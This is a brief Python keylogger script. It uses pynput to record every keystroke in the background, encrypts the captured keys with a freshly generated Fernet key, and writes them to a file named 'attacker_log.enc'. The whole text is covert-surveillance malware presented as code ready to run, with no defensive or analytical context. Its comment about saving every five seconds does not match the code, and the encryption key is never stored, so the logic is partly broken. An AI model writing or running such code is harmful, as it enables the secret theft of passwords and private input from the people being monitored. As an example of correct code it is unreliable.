from pynput import keyboard
from cryptography.fernet import Fernet
import time

log_file = "attacker_log.enc"

key = Fernet.generate_key()
cipher = Fernet(key)

captured = []

def on_press(key):
    try:
        k = key.char
    except:
        k = str(key)

    captured.append(k)

    # Save every 5 seconds
    if len(captured) > 20:
        data = "".join(captured).encode()
        encrypted = cipher.encrypt(data)

        with open(log_file, "wb") as f:
            f.write(encrypted)

listener = keyboard.Listener(on_press=on_press)
listener.start()

print("Keylogger running in background...")
time.sleep(60)  # keep running